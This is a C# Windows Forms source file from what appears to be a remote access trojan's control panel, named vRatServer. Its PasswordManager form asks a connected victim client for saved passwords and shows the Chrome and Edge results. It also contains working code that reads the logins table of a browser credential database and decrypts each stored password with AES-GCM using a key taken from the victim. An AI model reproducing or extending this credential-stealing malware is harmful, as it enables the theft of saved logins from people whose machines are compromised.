using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;

using System.IO;
using System.Security.Cryptography;

using System.Data.SQLite;

namespace vRatServer.Forms
{
    public partial class PasswordManager : Form
    {
        byte[]? r = null;
        Client client;
        public PasswordManager(Client? client)
        {
            this.client = client;
            InitializeComponent();
        }

        private void PasswordManager_Load(object sender, EventArgs e)
        {
            client.pam = this;
            this.Text = this.Text + "  - " + client.Name;
            globals.SendPacket(client, (byte)globals.PacketType.getpasswords, 0, 0, ref r);
        }

        private void PasswordManager_FormClosed(object sender, FormClosedEventArgs e)
        {
            client.pam = null;
        }



        public static List<(string Url, string Username, string Password)> ExtractSavedLogins(string tempDbPath, byte[] decryptedKey)
        {
            var savedLogins = new List<(string, string, string)>();

            using (var conn = new SQLiteConnection($"Data Source={tempDbPath};"))
            {
                conn.Open();
                using (var cmd = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", conn))
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        string url = reader.GetString(0);
                        string username = reader.GetString(1);
                        byte[] encryptedPassword = (byte[])reader[2];

                        try
                        {
                            string decryptedPassword = DecryptPassword(encryptedPassword, decryptedKey);
                            savedLogins.Add((url, username, decryptedPassword));
                        }
                        catch (Exception)
                        {
                            savedLogins.Add((url, username, "[Decryption Failed]"));
                        }
                    }
                }
            }

            File.Delete(tempDbPath);
            return savedLogins;
        }

        public void AddEdgLogs(string text)
        {
            textBox2.Text = textBox2.Text+text;
        }
        public void AddChromeLogs(string text)
        {
            textBox1.Text = textBox1.Text+text;
        }
        private static string DecryptPassword(byte[] encryptedData, byte[] key)
        {
            byte[] nonce = encryptedData[3..15];
            byte[] ciphertext = encryptedData[15..^16];
            byte[] tag = encryptedData[^16..];

            using (var aes = new AesGcm(key))
            {
                byte[] plaintext = new byte[ciphertext.Length];
                aes.Decrypt(nonce, ciphertext, tag, plaintext);
                return Encoding.UTF8.GetString(plaintext);
            }
        }







    }



}
